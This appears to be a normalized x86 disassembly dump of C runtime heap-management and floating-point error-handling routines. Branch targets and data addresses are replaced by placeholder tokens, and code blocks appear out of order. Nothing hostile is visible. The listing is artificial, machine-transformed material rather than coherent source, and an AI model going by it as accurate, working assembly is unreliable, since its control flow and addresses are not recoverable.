mov ebp esp
add esp 0xffffffe0
mov [ ebp - 0x20 ] eax
fstp [ ebp - 0x8 ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
lea eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x20 ]
push eax
push ecx
push edx
call sub_41d12b
add esp 0xc
fld [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x27f
je r-xdata
leave
retn
fldcw [ ebp + 0x8 ]
sub_4170b3
push ebp
mov ebp esp
push ecx
push ecx
push esi
lea eax [ ebp - 0x4 ]
xor esi esi
push eax
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] esi
call sub_40e109
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call sub_40e140
test eax eax
pop ecx
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_411f2e
add esp 0x14
cmp [ ebp - 0x4 ] 0x2
pop esi
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_411f2e
add esp 0x14
push 0x3
pop eax
leave
retn
cmp [ ebp - 0x8 ] 0x5
jb r-xdata
xor eax eax
inc eax
leave
retn
sub_41710e
xor eax eax
cmp [ esp + 0x4 ] eax
push 0x0
sete al
push 0x1000
push eax
call [ HeapCreate@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
call sub_4170b3
cmp eax 0x3
mov [ rw-data ] eax
jne r-xdata
xor eax eax
retn
xor eax eax
inc eax
retn
push 0x3f8
call sub_417168
test eax eax
pop ecx
jne r-xdata
push [ rw-data ]
call [ HeapDestroy@IAT ]
and [ rw-data ] 0x0
jmp r-xdata
sub_417168
push 0x140
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov ecx [ esp + 0x4 ]
and [ rw-data ] 0x0
and [ rw-data ] 0x0
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] ecx
mov [ rw-data ] 0x10
inc eax
retn
retn
sub_4171b0
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
add ecx eax
jmp r-xdata
cmp eax ecx
jb r-xdata
mov edx [ esp + 0x4 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
xor eax eax
retn
add eax 0x14
sub_4171db
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi esi
sub edi [ ecx + 0xc ]
add esi 0xfffffffc
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
test cl 0x1
mov [ ebp - 0x4 ] ecx
jne r-xdata
pop edi
pop esi
leave
retn
push ebx
lea ebx [ ecx + esi ]
mov edx [ ebx ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
test dl 0x1
mov [ ebp + 0xc ] ebx
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov [ ebp - 0x4 ] ecx
cmp edx 0x20
mov ebx 0x80000000
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edx * 8 ]
mov ebx [ ecx + 0x4 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] ebx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
sar edx 0x4
dec edx
cmp edx esi
mov [ ebp - 0x4 ] ecx
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
cmp edx 0x20
mov [ edx + eax + 0x4 ] cl
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
pop ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] edi
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
push 0x4000
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push ebx
push ecx
call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
mov ecx [ rw-data ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ecx edx
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
cmp ebx 0x20
mov esi 0x80000000
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
mov edx [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_41ba60
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_4174ef
mov eax [ rw-data ]
push esi
mov esi [ rw-data ]
push edi
xor edi edi
cmp esi eax
jne r-xdata
imul esi esi 0x14
add esi [ rw-data ]
push 0x41c4
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
cmp eax edi
mov [ esi + 0x10 ] eax
je r-xdata
add eax 0x10
imul eax eax 0x14
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
cmp eax edi
mov [ esi + 0xc ] eax
jne r-xdata
add [ rw-data ] 0x10
mov esi [ rw-data ]
mov [ rw-data ] eax
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
jmp r-xdata
sub_41759f
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
push ebx
push esi
mov esi [ ecx + 0x10 ]
push edi
xor ebx ebx
jmp r-xdata
test eax eax
jge r-xdata
add eax eax
inc ebx
mov eax ebx
imul eax eax 0x204
lea eax [ eax + esi + 0x144 ]
push 0x3f
mov [ ebp - 0x8 ] eax
pop edx
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
push 0x4
mov edi ebx
push 0x1000
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
lea edx [ edi + 0x7000 ]
cmp edi edx
mov [ ebp - 0x4 ] edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1f8
lea ecx [ edi + 0xc ]
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
xor edi edi
inc edi
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
mov ecx edx
sub ecx edi
shr ecx 0xc
lea eax [ edi + 0x10 ]
inc ecx
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea edx [ eax + 0xffc ]
mov [ eax ] edx
lea edx [ eax - 0x1004 ]
mov [ eax - 0x4 ] 0xff0
mov [ eax + 0x4 ] edx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
dec ecx
jne r-xdata
mov edx [ ebp - 0x4 ]
sub_4176a5
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov edx edi
sub edx [ ecx + 0xc ]
add esi 0x17
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
and esi 0xfffffff0
dec ecx
cmp esi ecx
lea edi [ ecx + edi - 0x4 ]
mov ebx [ edi ]
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
xor eax eax
inc eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp + 0xc ] ebx
mov [ ebx - 0x4 ] ecx
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
cmp ecx 0x3f
mov [ ebp - 0x8 ] ecx
jbe r-xdata
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] edi
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
cmp ecx 0x20
mov ebx 0x80000000
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov esi [ edi + 0x8 ]
mov ecx [ edi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
cmp esi 0x20
mov ebx 0x80000000
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
cmp edi 0x3f
lea ecx [ ecx + esi - 0x4 ]
jbe r-xdata
add ecx 0xffffffe0
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx esi
jmp r-xdata
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx 0x80000000
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
mov [ ebp + 0x13 ] cl
inc cl
cmp edi 0x20
mov [ edi + eax + 0x4 ] cl
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx edi
jmp r-xdata
mov ecx edi
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov edx 0x80000000
shr edx cl
or [ eax ] edx
sub_417984
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
imul eax eax 0x14
add eax [ rw-data ]
add ecx 0x17
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
push ebx
dec ecx
cmp ecx 0x20
push esi
push edi
jge r-xdata
add ecx 0xffffffe0
or edx 0xffffffff
xor esi esi
shr edx cl
mov [ ebp - 0x8 ] edx
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov ecx [ rw-data ]
mov ebx ecx
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx eax
jne r-xdata
add ebx 0x14
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
cmp edx 0xffffffff
mov [ ebp - 0x4 ] edx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
mov edx [ eax + 0xc4 ]
lea ecx [ eax + 0x44 ]
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
cmp ebx ecx
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov edx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
add ecx 0x4
jmp r-xdata
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
xor edi edi
and ecx esi
jne r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx ecx
jne r-xdata
test ecx ecx
jge r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
and ecx [ ebp - 0x8 ]
push 0x20
pop edi
jmp r-xdata
mov edi [ ecx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
add ebx 0x14
jmp r-xdata
add ecx ecx
inc edi
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp - 0x8 ] ecx
jle r-xdata
cmp ebx eax
jb r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
add ebx 0x14
mov [ ebp + 0x8 ] ebx
push ebx
call sub_41759f
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
test ecx ecx
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
mov ebx 0x80000000
jge r-xdata
xor eax eax
jmp r-xdata
cmp ebx ecx
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ edx + 0x8 ] ecx
mov [ edx + 0x4 ] edi
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx ecx
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xb ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov ebx [ ebp + 0x8 ]
and [ ebx ] ecx
jmp r-xdata
add ebx 0x14
call sub_4174ef
mov ebx eax
test ebx ebx
mov [ ebp + 0x8 ] ebx
jne r-xdata
and [ rw-data ] 0x0
cmp [ ebp + 0xb ] 0x0
jne r-xdata
cmp [ ebp + 0xb ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_417c67
push ebp
mov ebp esp
sub esp 0x28
xor eax eax
cmp [ rw-data ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] al
mov [ ebp - 0x6 ] al
mov [ ebp - 0x5 ] al
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] al
mov [ ebp - 0x2 ] al
mov [ ebp - 0x1 ] al
je r-xdata
mov eax sub_41d227
push [ rw-data ]
call sub_4116dd
pop ecx
jmp r-xdata
add ecx 0xfffffc18
cmp ecx 0xc
ja r-xdata
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx 0xa6
cmp ecx edx
jg r-xdata
pop edi
pop esi
pop ebx
leave
retn
jmp [ ecx * 4 + jump_table_417ee3 ]
mov [ ebp - 0x28 ] 0x3
mov [ ebp - 0x24 ] r--data
jmp r-xdata
cmp ecx 0x19
jg r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
fld [ edi ]
lea ecx [ ebp - 0x28 ]
fstp [ ebp - 0x20 ]
push ecx
fld [ ebx ]
fstp [ ebp - 0x18 ]
fld [ esi ]
fstp [ ebp - 0x10 ]
call eax
test eax eax
pop ecx
jne r-xdata
sub ecx 0x1a
je r-xdata
je r-xdata
fld [ edi ]
fstp [ ebp - 0x20 ]
fld [ ebx ]
fstp [ ebp - 0x18 ]
fld [ esi ]
jmp r-xdata
fld [ edi ]
fstp [ esi ]
jmp r-xdata
fld [ edi ]
fmul [ ebp - 0x8 ]
fst [ esi ]
fld [ edi ]
fstp [ ebp - 0x20 ]
fld [ ebx ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x10 ]
call sub_412089
mov [ eax ] 0x21
call sub_412089
mov [ eax ] 0x22
jmp r-xdata
fld1
jmp r-xdata
dec ecx
je r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov edx ecx
push 0x2
pop ecx
sub edx ecx
je r-xdata
lea ecx [ ebp - 0x28 ]
fstp [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x28 ] 0x1
call eax
test eax eax
pop ecx
jne r-xdata
fstp [ esi ]
mov [ ebp - 0x28 ] 0x2
jmp r-xdata
dec ecx
je r-xdata
fld [ edi ]
lea ecx [ ebp - 0x28 ]
fstp [ ebp - 0x20 ]
push ecx
fld [ ebx ]
mov [ ebp - 0x28 ] 0x4
fstp [ ebp - 0x18 ]
fld [ esi ]
fstp [ ebp - 0x10 ]
call eax
pop ecx
jmp r-xdata
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] r--data
jmp r-xdata
dec edx
je r-xdata
mov [ ebp - 0x24 ] r--data
dec ecx
je r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
sub edx 0x5
je r-xdata
mov [ ebp - 0x24 ] r--data
sub ecx 0x1d
je r-xdata
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] r--data
jmp r-xdata
dec edx
je r-xdata
sub ecx 0x3
jne r-xdata
mov [ ebp - 0x24 ] r--data
sub edx 0x5
je r-xdata
mov [ ebp - 0x28 ] 0x3
mov [ ebp - 0x24 ] r--data
jmp r-xdata
dec edx
je r-xdata
mov [ ebp - 0x24 ] r--data
sub edx 0x9
jne r-xdata
mov [ ebp - 0x28 ] 0x3
sub_418000
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
